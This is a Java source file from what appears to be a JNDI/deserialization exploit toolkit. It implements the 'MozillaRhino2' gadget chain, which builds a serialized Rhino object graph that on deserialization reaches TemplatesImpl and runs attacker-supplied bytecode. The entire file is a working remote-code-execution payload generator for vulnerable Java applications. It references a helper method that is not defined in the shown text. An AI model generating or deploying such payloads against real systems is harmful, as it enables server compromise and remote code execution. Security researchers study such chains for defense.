package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.Reflections;
import org.mozilla.javascript.*;
import org.mozilla.javascript.tools.shell.Environment;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.util.Hashtable;
import java.util.Map;

/**
 *     Works on rhino 1.6R6 and above & doesn't depend on BadAttributeValueExpException's readObject
 *
 *     Chain:
 *
 *     NativeJavaObject.readObject()
 *       JavaAdapter.readAdapterObject()
 *         ObjectInputStream.readObject()
 *           ...
 *             NativeJavaObject.readObject()
 *               JavaAdapter.readAdapterObject()
 *                 JavaAdapter.getAdapterClass()
 *                   JavaAdapter.getObjectFunctionNames()
 *                     ScriptableObject.getProperty()
 *                         ScriptableObject.get()
 *                           ScriptableObject.getImpl()
 *                             Method.invoke()
 *                               Context.enter()
 *         JavaAdapter.getAdapterClass()
 *           JavaAdapter.getObjectFunctionNames()
 *             ScriptableObject.getProperty()
 *               NativeJavaArray.get()
 *                 NativeJavaObject.get()
 *                   JavaMembers.get()
 *                     Method.invoke()
 *                       TemplatesImpl.getOutputProperties()
 *                         ...
 *
 *     by @_tint0
 */
public class MozillaRhino2 implements ObjectPayload<Object>{
    @Override
    public byte[] getBytes(PayloadType type, String... param) throws Exception {
        ScriptableObject    dummyScope       = new Environment();
        Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
        Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);

        Object initContextMemberBox = Reflections.createWithConstructor(
                Class.forName("org.mozilla.javascript.MemberBox"),
                (Class<Object>) Class.forName("org.mozilla.javascript.MemberBox"),
                new Class[]{Method.class},
                new Object[]{Context.class.getMethod("enter")});

        ScriptableObject initContextScriptableObject = new Environment();
        Method           makeSlot                    = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
        Reflections.setAccessible(makeSlot);
        Object slot = makeSlot.invoke(initContextScriptableObject, "nu1r", 0, 4);
        Reflections.setFieldValue(slot, "getter", initContextMemberBox);

        NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();
        Reflections.setFieldValue(initContextNativeJavaObject, "parent", dummyScope);
        Reflections.setFieldValue(initContextNativeJavaObject, "isAdapter", true);
        Reflections.setFieldValue(initContextNativeJavaObject, "adapter_writeAdapterObject",
                this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
        Reflections.setFieldValue(initContextNativeJavaObject, "javaObject", initContextScriptableObject);

        ScriptableObject scriptableObject = new Environment();
        scriptableObject.setParentScope(initContextNativeJavaObject);
        makeSlot.invoke(scriptableObject, "outputProperties", 0, 2);

        NativeJavaArray nativeJavaArray = Reflections.createWithoutConstructor(NativeJavaArray.class);
        Reflections.setFieldValue(nativeJavaArray, "parent", dummyScope);
        Reflections.setFieldValue(nativeJavaArray, "javaObject", Gadgets.createTemplatesImpl(type,param));
        nativeJavaArray.setPrototype(scriptableObject);
        Reflections.setFieldValue(nativeJavaArray, "prototype", scriptableObject);

        NativeJavaObject nativeJavaObject = new NativeJavaObject();
        Reflections.setFieldValue(nativeJavaObject, "parent", dummyScope);
        Reflections.setFieldValue(nativeJavaObject, "isAdapter", true);
        Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject",
                this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
        Reflections.setFieldValue(nativeJavaObject, "javaObject", nativeJavaArray);

        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
        oos.writeObject(nativeJavaObject);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }

    @Override
    public Object getObject(String command) throws Exception {
        return null;
    }
}
